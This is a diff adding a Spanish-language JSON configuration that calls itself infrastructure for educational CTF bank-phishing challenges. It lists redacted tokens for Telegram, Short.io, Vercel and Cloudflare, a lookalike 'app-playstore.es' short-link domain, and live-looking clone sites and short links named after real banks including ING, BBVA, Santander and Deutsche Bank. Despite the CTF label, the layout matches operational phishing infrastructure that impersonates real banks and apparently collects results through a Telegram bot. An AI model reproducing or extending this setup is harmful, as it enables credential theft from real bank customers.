@@ -1,0 +1,40 @@
+{
+  "meta": {
+    "tipo": "RETO CTF - Capture The Flag",
+    "descripcion": "Infraestructura para retos CTF de phishing bancario educativo",
+    "fecha_reporte": "2026-05-03"
+  },
+  "credentials": {
+    "telegram": {
+      "bot_token": "[REDACTED_FROM_REPORT]",
+      "chat_id": "[REDACTED_FROM_REPORT]"
+    },
+    "shortio": {
+      "api_key": "[REDACTED_FROM_REPORT]",
+      "domain": "app-playstore.es",
+      "domain_id": 1760496
+    },
+    "vercel": {
+      "token": "[REDACTED_FROM_REPORT]",
+      "scope": "personals-projects-72cd15c9"
+    },
+    "cloudflare": {
+      "api_token": "[REDACTED_FROM_REPORT]",
+      "account_id": "[REDACTED_FROM_REPORT]"
+    }
+  },
+  "active_sites": {
+    "ing": "https://vercel-ing.vercel.app",
+    "bbva": "https://vercel-bbva.vercel.app",
+    "mediolanum": "https://vercel-mediolanum.vercel.app",
+    "deutschebank": "https://vercel-deutschebank.vercel.app"
+  },
+  "shortio_links": {
+    "ing": "lnk_7nZ6_vg5ltYl29IoM8lIiEymLX",
+    "bbva": "lnk_7nZ6_uiMiJwzOLeZAlQfeIZQaA",
+    "santander": "lnk_7nZ6_GOWmygcDBGFoDidnwUPGx",
+    "unicaja": "lnk_7nZ6_ZQusZ7Jaw8o6uXjm2nJhr",
+    "ibercaja": "lnk_7nZ6_2RPikxMccQ3HmFYrYbkj6",
+    "abanca": "lnk_7nZ6_8RZPu0AKBnukeKElYHkYu"
+  }
+}
